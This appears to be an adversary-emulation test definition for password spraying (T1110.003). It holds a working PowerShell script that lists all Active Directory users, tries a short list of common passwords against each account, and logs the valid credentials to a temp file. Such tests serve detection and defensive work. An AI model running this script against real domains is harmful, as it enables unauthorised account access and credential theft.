attack_technique: T1110.003
display_name: 'Brute Force: Password Spraying'
atomic_tests:
- name: Password spray
  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
  description: |
    Attempt to brute force all domain users on remote host
  supported_platforms:
  - windows
  input_arguments:
    passwords:
      description: list of passwords we will attempt to brute force with
      type: String
      default: Pa`$`$w0rd`n123456`npassword
    domain:
      description: Domain name of the target system we will brute force upon
      type: String
      default: contoso.com
    output_file:
      description: Path to bruteforce output 
      type: Path
      default: C:\Windows\Temp\tmp.txt
    number_of_attempts:
      description: Number of password spraying attempts 
      type: String
      default: 2
  executor:
    name: powershell
    command: |
      $DomainUsers = Get-ADUser -Filter * | Select-Object -Property SamAccountName
      $passwords = '#{passwords}'.split('`n')
      $found = @()
      for ($i = 0; $i -lt #{number_of_attempts}; $i++) {
        "[-] Round ${i} of password password spraying" | Out-File -FilePath #{output_file} -Append
        $DomainUsers | Foreach-Object {
          foreach ($password in $passwords){
            " [-] Attempting ${password} on account $($_.SamAccountName)." | Out-File -FilePath #{output_file} -Append
            if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
              if (-not ($found.Contains("$($_.SamAccountName):${password}"))){
                " [!] $($_.SamAccountName):${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
                $found += ,"$($_.SamAccountName):${password}"
              }
            }
          }
        }
      }
      "End of bruteforce" | Out-File -FilePath #{output_file} -Append